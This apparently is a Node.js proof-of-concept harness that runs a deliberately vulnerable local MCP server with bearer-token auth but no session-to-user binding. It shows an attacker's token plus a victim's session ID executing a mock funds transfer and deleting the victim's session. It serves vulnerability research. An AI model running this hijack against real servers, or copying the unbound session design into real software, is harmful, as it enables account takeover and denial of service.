// 靶机#4：官方 SDK + 认证层（Bearer token middleware）——「认证后 sid 仍解耦主体?」
// P-A1: attacker 用【自己的合法token】+【受害者sid】能否执行工具（跨主体接管）
// P-A2: attacker 用自己的token + victim sid DELETE 能否杀会话（跨主体DoS）
// 对照: 无token→401（证明认证层真实生效）
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { StreamableHTTPServerTransport } from "@modelcontextprotocol/sdk/server/streamableHttp.js";
import { z } from "zod";
import express from "express";
import { randomUUID } from "node:crypto";

const TOKENS = { alice: "tok-alice-9f3e", attacker: "tok-attacker-2b7d" };
let curSubject = "-";
let serverLog = "";
const origLog = console.log;
console.log = (...a) => { serverLog += a.join(" ") + " | "; origLog(...a); };
const app = express(); app.use(express.json());

// 认证 middleware：验证 token 合法性（模拟 OAuth bearer 校验），但【不做 session↔subject 绑定】
app.use("/mcp", (req, res, next) => {
  const auth = req.headers["authorization"] || "";
  const tok = auth.replace(/^Bearer\s+/i, "");
  if (!TOKENS[tok] === false || Object.values(TOKENS).includes(tok)) { req.subject = Object.entries(TOKENS).find(([, v]) => v === tok)[0]; curSubject = req.subject; return next(); }
  res.status(401).json({ error: "unauthorized" });
});

const transports = {};
app.post("/mcp", async (req, res) => {
  console.log(`REQ subj=${req.subject} m=${req.body?.method} sid=${(req.headers["mcp-session-id"] || "-").slice(0, 8)}`);
  const sessionId = req.headers["mcp-session-id"];
  let transport;
  if (sessionId && transports[sessionId]) transport = transports[sessionId];
  else if (!sessionId && req.body?.method === "initialize") {
    transport = new StreamableHTTPServerTransport({ sessionIdGenerator: () => randomUUID(), onsessioninitialized: (s) => { transports[s] = transport; } });
    const server = new McpServer({ name: "target4-auth", version: "1.0.0" });
    server.tool("transfer_funds", { amount: z.string() }, async ({ amount }) => { console.log(`TRANSFER-EXEC:${curSubject}:$${amount}`); return { content: [{ type: "text", text: `transferred:${amount}` }] }; });
    await server.connect(transport);
  } else { res.status(400).json({ jsonrpc: "2.0", error: { code: -32000, message: "no valid session" } }); return; }
  try { await transport.handleRequest(req, res, req.body); } catch (e) { console.log("ERR:" + e.message); }
});
app.delete("/mcp", async (req, res) => {
  const t = transports[req.headers["mcp-session-id"]];
  console.log(`DELETE subj=${req.subject} sid=${(req.headers["mcp-session-id"] || "-").slice(0, 8)} known=${!!t}`);
  if (!t) { res.status(404).end(); return; }
  await t.handleRequest(req, res, req.body);
});

const srv = app.listen(0, async () => {
  const port = srv.address().port, URL = `http://127.0.0.1:${port}/mcp`;
  const R = [];
  const call = (h, b) => fetch(URL, { method: "POST", headers: { "Content-Type": "application/json", "Accept": "application/json, text/event-stream", ...h }, body: JSON.stringify(b), signal: AbortSignal.timeout(9000) });
  const readBody = async (r) => { const ct = r.headers.get("content-type") || ""; if (ct.includes("event-stream")) { const rd = r.body.getReader(); let buf = ""; const t = setTimeout(() => rd.cancel(), 2500); try { while (buf.length < 2048) { const { done, value } = await rd.read(); if (done) break; buf += new TextDecoder().decode(value); if (buf.includes("result")) break; } } catch (e) {} clearTimeout(t); return buf; } return r.text(); };

  // 对照0: 无token → 401
  const r0 = await fetch(URL, { method: "POST", headers: { "Content-Type": "application/json", "Accept": "application/json" }, body: JSON.stringify({ jsonrpc: "2.0", id: 0, method: "ping" }) });
  R.push(["P-A0 对照:无token被401拒(认证层生效)", r0.status === 401, `status=${r0.status}`]);

  // alice 合法初始化（victim）
  const r1 = await call({ "Authorization": `Bearer ${TOKENS.alice}` }, { jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "alice", version: "1.0" } } });
  const sidA = r1.headers.get("mcp-session-id");
  await call({ "Authorization": `Bearer ${TOKENS.alice}`, "mcp-session-id": sidA }, { jsonrpc: "2.0", method: "notifications/initialized" });
  R.push(["P-A0b alice合法会话建立", r1.status === 200 && !!sidA, `sid=${(sidA || "").slice(0, 8)}`]);

  // 攻击1: attacker 自己的合法token + alice的sid → transfer_funds
  const r2 = await call({ "Authorization": `Bearer ${TOKENS.attacker}`, "mcp-session-id": sidA }, { jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: "transfer_funds", arguments: { amount: "99999" } } });
  const b2 = await readBody(r2);
  R.push(["P-A1 认证后跨主体接管(attacker token+victim sid执行转账)", r2.status === 200 && serverLog.includes("TRANSFER-EXEC:attacker"), `status=${r2.status} 转账以attacker身份经victim会话执行: ${serverLog.includes("TRANSFER-EXEC:attacker")}`]);

  // 攻击2: attacker 自己的token + alice的sid → DELETE
  const r3 = await fetch(URL, { method: "DELETE", headers: { "Authorization": `Bearer ${TOKENS.attacker}`, "mcp-session-id": sidA } });
  R.push(["P-A2 认证后跨主体杀会话", r3.status === 200, `DELETE status=${r3.status}`]);
  const r4 = await call({ "Authorization": `Bearer ${TOKENS.alice}`, "mcp-session-id": sidA }, { jsonrpc: "2.0", id: 3, method: "tools/list" });
  R.push(["P-A2b 受害者自己的合法token也被拒(sid已死)", r4.status === 404 || r4.status === 400, `victim后续 status=${r4.status}`]);

  console.log("=== 靶机#4 · 官方SDK+认证层（解耦判定） ===");
  for (const [n, ok, ev] of R) console.log(`${ok ? "!!成立" : "OK不成立"} | ${n} | ${ev}`);
  console.log("serverLog:", serverLog.slice(0, 600));
  process.exit(0);
});
